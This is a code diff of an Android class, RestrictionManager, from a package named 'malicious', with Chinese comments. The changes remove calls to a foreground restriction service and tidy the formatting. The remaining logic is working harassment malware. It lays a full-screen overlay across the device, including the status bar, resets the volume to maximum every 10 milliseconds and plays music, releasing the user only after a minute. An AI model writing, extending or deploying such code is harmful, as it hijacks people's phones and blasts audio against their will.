@@ -12,11 +12,9 @@ import android.view.View;
 import android.view.WindowManager;
 import android.widget.Toast;
 import com.example.malicious.R;
-import com.example.service.MusicService;
-import com.example.service.RestrictionService;
-
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
+import com.example.service.MusicService;
 
 
 // 限制管理器
@@ -25,7 +23,6 @@ public class RestrictionManager {
     private WindowManager windowManager;
     private View overlayView;
     private final ScheduledExecutorService scheduler;
-
     public RestrictionManager(final Context context, final ScheduledExecutorService scheduler) {
         this.context = context;
         this.scheduler = scheduler;
@@ -35,7 +32,6 @@ public class RestrictionManager {
     // 启动限制功能
     public void startRestriction() {
         showOverlay(); // 显示覆盖层
-        startService(new Intent(context, RestrictionService.class)); // 启动前台服务
         scheduler.scheduleWithFixedDelay(this::setMaxVolume, 0, 10, TimeUnit.MILLISECONDS); // 最大化音量
         startService(new Intent(context, MusicService.class)); // 启动音乐服务
         new Handler().postDelayed(this::stopRestriction, 60 * 1000); // 恢复用户操作
@@ -55,7 +51,7 @@ public class RestrictionManager {
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY, // 使用悬浮窗类型
                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, // 不获取焦点
-                PixelFormat.TRANSLUCENT // 半透明背景
+                PixelFormat.TRANSLUCENT  // 半透明背景
         );
 
         // 设置悬浮窗覆盖状态栏
@@ -69,7 +65,6 @@ public class RestrictionManager {
     // 停止限制功能
     private void stopRestriction() {
         if (overlayView != null) windowManager.removeView(overlayView); // 移除覆盖层
-        stopService(new Intent(context, RestrictionService.class)); // 停止前台服务
         stopService(new Intent(context, MusicService.class)); // 停止音乐服务
         scheduler.shutdown(); // 关闭调度器
     };
@@ -83,9 +78,7 @@ public class RestrictionManager {
                 audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                 final int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                 audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, AudioManager.FLAG_SHOW_UI);
-            } catch (Exception e) {
-                Toast.makeText(context, "无法修改音量", Toast.LENGTH_SHORT).show();
-            };
+            } catch (Exception e) { Toast.makeText(context, "无法修改音量", Toast.LENGTH_SHORT).show(); };
         };
     };
 
